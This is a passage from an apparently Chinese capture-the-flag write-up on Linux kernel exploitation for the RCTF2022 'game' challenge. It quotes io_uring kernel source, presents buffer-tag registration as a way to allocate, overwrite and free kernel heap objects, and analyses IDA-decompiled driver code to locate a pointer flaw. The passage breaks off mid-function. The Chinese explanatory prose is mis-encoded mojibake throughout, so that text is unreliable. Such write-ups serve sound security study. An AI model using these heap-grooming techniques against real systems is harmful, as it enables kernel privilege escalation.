*tags,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_register</span> <span class="title">reg</span> =</span> &#123;</span><br><span class="line">.nr = nr,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS2, &amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_ROUND_UP(n,d) (((n) + (d) - 1) / (d))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __cold <span class="keyword">void</span> **<span class="title">io_alloc_page_table</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"><span class="keyword">size_t</span> init_size = size;</span><br><span class="line"><span class="keyword">void</span> **table;</span><br><span class="line"></span><br><span class="line">table = kcalloc(nr_tables, <span class="keyword">sizeof</span>(*table), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> this_size = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">table[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table[i]) &#123;</span><br><span class="line">io_free_page_table(table, init_size);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">size -= this_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆä¼šè¿›å…¥ä¸Šé¢è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå…¶ä¸­çš„sizeæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œæ§åˆ¶çš„ï¼Œå¯ä»¥æ˜æ˜¾çš„çœ‹å‡ºæ¥è¿™é‡Œå¯ä»¥çœŸæ­£å®ç°ä»»æ„å¤§å°åˆ†é…ï¼Œå¹¶ä¸”åœ¨<code>table[i]</code>ä¹Ÿå°±æ˜¯<code>ctx-&gt;buf_data-&gt;tags[i]</code>ä¸­ä¸å«æœ‰ä»»ä½•æŒ‡é’ˆæˆ–è€…æ•°æ®ä¹‹ç±»çš„ï¼Œåœ¨<code>table</code>ä¹Ÿå°±æ˜¯<code>ctx-&gt;buf_data-&gt;tags</code>ä¸­åªå«æœ‰åé¢åˆ†é…çš„objectæŒ‡é’ˆã€‚</p><h4 id="æ›´æ–°object"><a href="#æ›´æ–°object" class="headerlink" title="æ›´æ–°object"></a>æ›´æ–°object</h4><p>å½“æˆ‘ä»¬è°ƒç”¨<code>io_uring_register_buffers_update_tag</code>å‡½æ•°æ—¶ï¼Œå¯ä»¥å¯¹tagsä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢<code>table[i]</code>ä¸­åˆ†é…çš„objectè¿›è¡Œå†…å®¹æ›´æ–°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">unsigned</span> off,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_update2</span> <span class="title">up</span> =</span> &#123;</span><br><span class="line">.offset= off,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">.nr = nr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS_UPDATE, &amp;up, <span class="keyword">sizeof</span>(up));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IO_RSRC_TAG_TABLE_SHIFT(PAGE_SHIFT - 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u64 *<span class="title">io_get_tag_slot</span><span class="params">(struct io_rsrc_data *data, <span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> off = idx &amp; IO_RSRC_TAG_TABLE_MASK;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> table_idx = idx &gt;&gt; IO_RSRC_TAG_TABLE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;data-&gt;tags[table_idx][off];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __io_sqe_buffers_update(struct io_ring_ctx *ctx,</span><br><span class="line">   struct io_uring_rsrc_update2 *up,</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span><br><span class="line">&#123;</span><br><span class="line">u64 __user *tags = u64_to_user_ptr(up-&gt;tags);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>, __<span class="title">user</span> *<span class="title">iovs</span> =</span> u64_to_user_ptr(up-&gt;data);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">last_hpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> needs_switch = <span class="literal">false</span>;</span><br><span class="line">__u32 done;</span><br><span class="line"><span class="keyword">int</span> i, err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;buf_data)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (done = <span class="number">0</span>; done &lt; nr_args; done++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span> *<span class="title">imu</span>;</span></span><br><span class="line"><span class="keyword">int</span> offset = up-&gt;offset + done;</span><br><span class="line">u64 tag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = io_copy_iov(ctx, &amp;iov, iovs, done);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], <span class="keyword">sizeof</span>(tag))) &#123;</span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_buffer_validate(&amp;iov);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!iov.iov_base &amp;&amp; tag) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">i = array_index_nospec(offset, ctx-&gt;nr_user_bufs);</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;</span><br><span class="line">err = io_queue_rsrc_removal(ctx-&gt;buf_data, i,</span><br><span class="line">    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);</span><br><span class="line"><span class="keyword">if</span> (unlikely(err)) &#123;</span><br><span class="line">io_buffer_unmap(ctx, &amp;imu);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;user_bufs[i] = ctx-&gt;dummy_ubuf;</span><br><span class="line">needs_switch = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;user_bufs[i] = imu;</span><br><span class="line">*io_get_tag_slot(ctx-&gt;buf_data, offset) = tag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_switch)</span><br><span class="line">io_rsrc_node_switch(ctx, ctx-&gt;buf_data);</span><br><span class="line"><span class="keyword">return</span> done ? done : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œæ›´æ–°æ–¹å¼ä¹Ÿå¾ˆç‹¬æ ‘ä¸€å¸œï¼Œå¹¶ä¸æ˜¯ç®€å•çš„<code>copy_from_user</code>ä¹‹ç±»çš„ï¼Œè€Œæ˜¯å…«ä¸ªå­—èŠ‚å…«ä¸ªå­—èŠ‚çš„å†™ã€‚</p><h4 id="é‡Šæ”¾object"><a href="#é‡Šæ”¾object" class="headerlink" title="é‡Šæ”¾object"></a>é‡Šæ”¾object</h4><p>è°ƒç”¨<code>io_uring_unregister_buffers</code>å‡½æ•°å³å¯å¯¹æ‰€æœ‰objectè¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_unregister_buffers</span><span class="params">(struct io_uring *ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_UNREGISTER_BUFFERS, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">io_free_page_table</span><span class="params">(<span class="keyword">void</span> **table, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++)</span><br><span class="line">kfree(table[i]);</span><br><span class="line">kfree(table);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨åˆ°çš„æ˜¯ä¸Šé¢è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå…¶ä¸­tableçš„å«ä¹‰è·Ÿåˆ†é…æ—¶ä¸€è‡´ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>é€šè¿‡ä¸Šé¢ä¸‰ä¸ªæ–¹å‘çš„åˆ†æï¼Œå„ä½å¤§ä½¬åº”è¯¥èƒ½æƒ³åˆ°IO_uringåœ¨å¾ˆå¤šæ–¹é¢éƒ½å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œä¸è¿‡ä»–çš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä»–æ— æ³•è¯»å–å †å—ä¸Šçš„å†…å®¹(å¯èƒ½æ˜¯æˆ‘æ²¡æ‰¾åˆ°ï¼Œæ‰¾åˆ°çš„ä½¬å¯ä»¥ç•™è¨€ä¸€ä¸‹)ã€‚</p><h2 id="RCTF2022-game"><a href="#RCTF2022-game" class="headerlink" title="RCTF2022 game"></a>RCTF2022 game</h2><p>ç°åœ¨å¼€å§‹é¢˜ç›®åˆ†æï¼Œå‡ºé¢˜äººå¸ˆå‚…æ˜¯ç»™äº†æºä»£ç çš„ï¼Œä½†æ˜¯é€šè¿‡idaé€†å‘å¹¶ä¸å›°éš¾ï¼Œæ‰€ä»¥ä¸‹é¢è¿˜æ˜¯ç»™idaä¸­çš„ä»£ç </p><h3 id="é©±åŠ¨åˆ†æ"><a href="#é©±åŠ¨åˆ†æ" class="headerlink" title="é©±åŠ¨åˆ†æ"></a>é©±åŠ¨åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hhoge_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  __int64 v8; <span class="comment">// r15</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  Maind *maind_chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 new_chunk; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *username; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v14; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD v15[<span class="number">5</span>]; <span class="comment">// [rsp-58h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v21 = v4;</span><br><span class="line">  v20 = v8;</span><br><span class="line">  v19 = v7;</span><br><span class="line">  v18 = v6;</span><br><span class="line">  v17 = v5;</span><br><span class="line">  v16 = v3;</span><br><span class="line">  maind_chunk = *(Maind **)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v15[<span class="number">4</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( maind_chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(v15, v9, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      change(maind_chunk, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        hhoge_unlocked_ioctl_cold();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">            reborn_0(maind_chunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printk(<span class="string">&quot;born&quot;</span>);</span><br><span class="line">          new_chunk = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">          username = maind_chunk-&gt;username;</span><br><span class="line">          v13 = <span class="number">8LL</span>;</span><br><span class="line">          v14 = v15;</span><br><span class="line">          maind_chunk-&gt;cur = (<span class="keyword">void</span> *)new_chunk;</span><br><span class="line">          *(_QWORD *)(new_chunk + <span class="number">8</span>) = <span class="string">&quot;ordinary&quot;</span>;</span><br><span class="line">          maind_chunk-&gt;id = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v13 )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_DWORD *)username = *v14++;</span><br><span class="line">            username += <span class="number">4</span>;</span><br><span class="line">            --v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ioctlä¸­åˆ†ä¸ºäº†å››ç±»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">reborn_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *cur; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// rdi</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;reborn&quot;</span>);</span><br><span class="line">  v2 = (<span class="keyword">void</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  v4 = <span class="number">6LL</span>;</span><br><span class="line">  context-&gt;prv = v2;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  v6 = cur;</span><br><span class="line">  <span class="keyword">while</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5++ = *v6++;</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_QWORD *)cur + <span class="number">1</span>) = <span class="string">&quot;unlucky&quot;</span>;</span><br><span class="line">  *((_QWORD *)context-&gt;cur + <span class="number">2</span>) = <span class="number">0xFFFFFFFFFFFE40AE</span>LL;</span><br><span class="line">  ++context-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>reborn_0</code>å‡½æ•°å¹¶æ²¡æœ‰å°†æ–°åˆ†é…çš„objectç»™åˆ°curæŒ‡é’ˆä¸­ï¼Œè€Œæ˜¯ç»™åˆ°äº†<code>context-&gt;prv</code>ä¸­å»äº†ã€‚å¹¶ä¸”ä¼šæŠŠ<code>context-&gt;cur[0]</code>çš„å†…å®¹å¤åˆ¶åˆ°<code>context-&gt;prv[0]</code>ä¸­å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change_cold</span><span class="params">(Maind *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// kr08_8</span></span><br><span class="line">  _QWORD *cur; <span class="comment">// r13</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  printk(<span class="string">&quot;change&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = strsep((<span class="keyword">char</span> **)(v1 - <span class="number">0x38</span>), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      v5 = v4;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">LABEL_24:</span><br><span class="line">        JUMPOUT(<span class="number">0x132</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !*v4 );</span><br><span class="line">    v6 = <span class="built_in">strchr</span>(v4, <span class="number">0x3D</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="built_in">strlen</span>(v6 + <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 - <span class="number">1</span> &lt;= <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cur = a1-&gt;cur;</span><br><span class="line">        <span class="keyword">if</span> ( !cur )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != (<span class="keyword">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = kmemdup_nul(v6 + <span class="number">1</span>, v7 - <span class="number">1</span>, <span class="number">0xCC0</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        